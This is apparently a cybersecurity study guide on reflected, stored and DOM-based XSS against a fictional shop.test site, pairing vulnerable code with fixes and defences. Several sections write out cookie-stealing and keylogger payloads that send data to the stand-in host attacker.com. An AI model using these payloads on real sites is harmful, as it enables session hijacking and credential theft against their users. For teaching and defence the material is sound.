# Theory

XSS (Cross-Site Scripting) is a vulnerability where an attacker injects malicious scripts into web pages viewed by other users. Because the browser trusts scripts served from the target domain, the injected script runs in the victim's browser with full access to the page's DOM, cookies, and session tokens — allowing session hijacking, credential theft, and UI manipulation.

## Key Aspects

	Malicious script executes in the victim's browser in the context of the trusted site
	Exploits the browser's trust in scripts from the target origin
	Types: Reflected XSS, Stored XSS & DOM-Based XSS

# Scenarios
## Reflected XSS

A search page reflects the user's query back in the response:

URL:
`https://shop.test/search?q=phone`

Response:
```html
<p>Search results for: phone</p>
```

The server embeds the `q` parameter directly into the HTML response without encoding it.

### a. Predict the Backend Behaviour

```python
query = request.args.get('q')
return f"<p>Search results for: {query}</p>"  # raw interpolation — no HTML encoding
```

The value of `q` is inserted into the HTML string without escaping `<`, `>`, or `"` characters — any HTML/JavaScript the attacker places in `q` will be rendered by the victim's browser.

### b. Modify the request to test for Reflected XSS

Inject a basic `<script>` tag:

```
https://shop.test/search?q=<script>alert(1)</script>
```

- If an alert box with `1` appears in the browser, the input was rendered as HTML → **vulnerable to Reflected XSS**.
- If the page shows `<script>alert(1)</script>` as plain text, the input was HTML-encoded → not vulnerable.

Test with an image tag (useful when `<script>` is filtered):

```
https://shop.test/search?q=<img src=x onerror=alert(1)>
```

### c. Conditions required for Reflected XSS

1. The application must **reflect user input** in the HTTP response.
2. The reflected data must be **inserted into an HTML context** without proper encoding (`&lt;` for `<`, `&gt;` for `>`).
3. The response must be served as **`text/html`** content type (not JSON or plain text).
4. The victim must **click an attacker-crafted URL** that includes the malicious payload in the query string.
5. No **Content Security Policy (CSP)** blocks inline script execution.

> Reflected XSS is non-persistent — it only fires when a victim clicks the crafted link. The attacker must distribute the malicious URL via phishing, social media, or other means.

### d. Craft a payload to steal the victim's session cookie

```
https://shop.test/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

- When the victim clicks this URL, the injected script runs in their browser.
- `document.cookie` is sent to `attacker.com/steal` as a URL parameter.
- The attacker reads their access log → obtains the victim's session cookie → hijacks the session.

URL-encoded version (for sharing via link):
```
https://shop.test/search?q=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fattacker.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E
```

### e. Craft a payload to perform a keylogger injection

```
https://shop.test/search?q=<script>
document.addEventListener('keypress', function(e){
  fetch('https://attacker.com/log?k='+e.key);
});
</script>
```

- Every key the victim presses on the shop page is sent to the attacker's server.
- Captures passwords typed into any form on the same page.

---

## Stored XSS

A product review section allows users to post reviews that are stored in the database and displayed to all visitors:

URL:
`POST https://shop.test/review`
`Body: product_id=10&review=Great+product!`

The review text is stored without sanitisation and rendered directly into the product page HTML for every visitor.

### a. Predict the Backend Behaviour

```python
# On POST — store review
db.execute("INSERT INTO reviews (product_id, content) VALUES (?, ?)", (product_id, review))

# On GET — render page
for review in db.execute("SELECT content FROM reviews WHERE product_id=10"):
    html += f"<li>{review['content']}</li>"   # raw interpolation — no HTML encoding
```

The review content is stored and later inserted into the HTML without encoding — any script stored in the review fires for **every user** who views the product page.

### b. Modify the request to test for Stored XSS

Submit a review containing a script tag:

```
POST /review HTTP/1.1
Host: shop.test
Content-Type: application/x-www-form-urlencoded

product_id=10&review=<script>alert('XSS')</script>
```

- Navigate to the product page for product `10`.
- If an alert fires when the page loads, the stored content is rendered as HTML → **vulnerable to Stored XSS**.
- The payload fires for **every user** who visits the page — including admins.

### c. Conditions required for Stored XSS

1. The application must **store user-supplied data** in a persistent store (database, file, cache).
2. The stored data must later be **retrieved and embedded into HTML** without encoding.
3. The rendered page must be **served to other users** (not just the submitter).
4. No **output encoding**, sanitisation, or CSP prevents the injected script from executing.

> Stored XSS is more dangerous than Reflected XSS — it is persistent and does not require tricking each victim into clicking a crafted URL. A single submission compromises every user who views the affected page.

### d. Craft a payload to hijack an admin's session via the review section

```
POST /review HTTP/1.1
Host: shop.test
Content-Type: application/x-www-form-urlencoded

product_id=10&review=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

- Every user (including admin) who views product 10's page sends their cookie to `attacker.com`.
- Attacker uses the admin's session cookie to log into the admin panel.

### e. State the defences against XSS and explain how they break the attack

| Defence | How it works | How it breaks XSS |
|---|---|---|
| **Output encoding** | Encode `<`, `>`, `"`, `'`, `&` as HTML entities before inserting into HTML | `<script>` becomes `&lt;script&gt;` — rendered as text, never executed |
| **Content Security Policy (CSP)** | `Content-Security-Policy: script-src 'self'` — only scripts from the same origin are allowed | Inline `<script>` tags and `onerror` handlers are blocked by the browser |
| **`HttpOnly` cookie flag** | `Set-Cookie: session=...; HttpOnly` — JavaScript cannot read `document.cookie` | `document.cookie` returns an empty string — session cookie cannot be stolen |
| **Input validation / allowlisting** | Reject input containing HTML tags or special characters at the point of input | Malicious payload is rejected before it is stored or reflected |
| **Sanitisation libraries** | Use vetted libraries (e.g., DOMPurify for client-side, Bleach for Python) to strip dangerous HTML | Injected script tags and event handlers are stripped from the stored/reflected content |

---

## DOM-Based XSS

A single-page application reads a URL fragment and writes it directly into the DOM:

URL:
`https://shop.test/welcome#Alice`

JavaScript:
```javascript
const name = location.hash.slice(1);           // reads "Alice" from the URL fragment
document.getElementById('greeting').innerHTML = "Hello, " + name;  // writes to DOM
```

The server never sees the fragment (`#...`) — it is processed entirely client-side. No server-side check is possible.

### a. Predict the Frontend Behaviour

1. Page loads — JavaScript reads `location.hash` (everything after `#`).
2. The value is assigned to `innerHTML` without sanitisation.
3. If the value contains HTML tags, the browser parses and renders them — any `<script>` or event handlers execute.

### b. Craft a DOM-Based XSS payload

```
https://shop.test/welcome#<img src=x onerror=alert(document.cookie)>
```

- The fragment `<img src=x onerror=alert(document.cookie)>` is read by `location.hash.slice(1)`.
- It is assigned to `innerHTML` → browser parses the tag → `src=x` fails to load → `onerror` fires → cookie is shown/exfiltrated.

Note: `<script>` tags inserted via `innerHTML` do **not** execute in most modern browsers — use event handler payloads (`onerror`, `onload`, `onfocus`) instead.

### c. Conditions required for DOM-Based XSS

1. JavaScript reads data from a **user-controlled DOM source** (`location.hash`, `location.search`, `document.referrer`, `localStorage`, etc.).
2. The data is passed to a **dangerous sink** without sanitisation (`innerHTML`, `document.write`, `eval`, `setTimeout` with a string argument).
3. No **CSP** blocks inline event handlers or the sink in use.
4. The victim must **click a crafted URL** (since the fragment is part of the URL, not the server response).

> DOM-Based XSS is entirely client-side — the server plays no role. Traditional server-side output encoding does not help; the fix must be in the JavaScript code.

### d. Craft a payload to steal cookies via DOM XSS

```
https://shop.test/welcome#<svg onload=fetch('https://attacker.com/?c='+document.cookie)>
```

- `<svg>` with `onload` is a reliable alternative when `<script>` and `<img onerror>` are filtered.
- On page load, the SVG element fires `onload` → cookie is sent to `attacker.com`.

### e. Fix the DOM-Based XSS vulnerability

**Vulnerable code:**
```javascript
document.getElementById('greeting').innerHTML = "Hello, " + location.hash.slice(1);
```

**Fixed code:**
```javascript
const name = location.hash.slice(1);
document.getElementById('greeting').textContent = "Hello, " + name;
// textContent assigns plain text — HTML tags are never parsed
```

Or use DOMPurify for cases where some HTML must be allowed:
```javascript
const name = DOMPurify.sanitize(location.hash.slice(1));
document.getElementById('greeting').innerHTML = "Hello, " + name;
```

---

# Exam-Style Questions

## Question 1 — BlogSpace.com

A blogging platform **BlogSpace.com** allows users to post comments. Comment text is stored in the database and displayed on all blog posts. When a comment containing `<b>bold</b>` is posted, the page renders the text in **bold** — confirming HTML is not encoded.

### (a) Identify the vulnerability and its type

**Stored XSS** — user-supplied HTML is stored without sanitisation and rendered for all visitors.

### (b) Craft a payload to steal all visitor cookies

```
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

- Post this as a comment.
- Every user who reads the blog post sends their session cookie to `attacker.com`.

### (c) Explain the impact if an admin visits the page

- Admin's session cookie is sent to `attacker.com`.
- Attacker replaces their session cookie in the browser → accesses the admin panel.
- Potential impact: delete posts, create admin accounts, access private user data, deface the site.

### (d) Recommend two fixes

```
1. HTML-encode all output: replace < with &lt;, > with &gt;, etc. before inserting into HTML.
2. Set the HttpOnly flag on session cookies: Set-Cookie: session=...; HttpOnly
   (Even if XSS fires, document.cookie returns empty — session cannot be stolen.)
```
